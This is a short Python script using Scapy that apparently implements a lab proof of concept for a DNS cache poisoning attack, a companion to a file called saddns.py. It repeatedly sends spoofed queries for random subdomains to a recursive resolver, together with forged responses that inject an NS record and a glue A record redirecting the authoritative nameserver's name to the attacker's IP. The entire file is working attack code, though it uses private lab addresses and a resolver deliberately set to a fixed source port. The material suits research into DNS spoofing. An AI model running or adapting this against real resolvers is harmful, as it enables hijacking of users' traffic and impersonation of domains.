# import os
# os.sys.path.append("/home/attacker/.local/bin")
import scapy.all
from scapy.all import *
import random
import string
import time

# Most of the code here is also found in saddns.py and is documented there.
# What's important to note here is that we presumably already know the source port
# the recursive resolver uses to query the authoritative nameserver. Furthermore,
# whereas in saddns.py we only try to inject an A record as a proof of concept,
# here we actually inject an A record for the authoritative nameserver itself
target_domain = "site.dummy.com"
target_resolver_ip = '192.168.16.130'
attacker_ip = '192.168.16.158'
target_auth_ip = '192.168.16.150'
target_auth_domain = "auth.dummy.com"
source_port = 50000


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


pkt_query = IP(src=attacker_ip, dst=target_resolver_ip) / \
            UDP(sport=source_port, dport=53) / DNS(id=50000, rd=1, qd=DNSQR(qname=target_domain + "."))
pkt_answer = IP(src=target_auth_ip, dst=target_resolver_ip) / \
             UDP(sport=53, dport=source_port) / \
             DNS(id=50000, qd=DNSQR(qname=target_domain + ".", qtype="A", qclass="IN"), aa=0, qr=1,
                 ns=DNSRR(rrname=target_domain + ".", ttl=10, type="NS", rdata=target_auth_domain + "."), ar=(
                     DNSRR(rrname=target_auth_domain + ".", type="A", rclass="IN", ttl=36000, rdlen=4,
                           rdata=attacker_ip)))

s = conf.L3socket()
while True:
    d_str = get_random_string(4) + "." + target_domain + "."
    pkt_query[DNS].qd = DNSQR(qname=d_str)
    pkt_answer[DNS].qd = DNSQR(qname=d_str)
    pkt_answer[DNS].id = random.randrange(1024, 65535)
    pkt_query[DNS].id = random.randrange(1024, 65535)
    s.send(pkt_query)
    s.send(pkt_answer)
    # In order to make this attack feasible, I restricted the BIND configuration
    # of the recursive nameserver to have a fixed source port for queries. For some
    # reason, this led to problems with rate limiting, regardless of how I
    # configured rate limiting in the BIND config. Therefore, I was forced
    # to include the sleep statement below to slow down the queries
    time.sleep(.05)
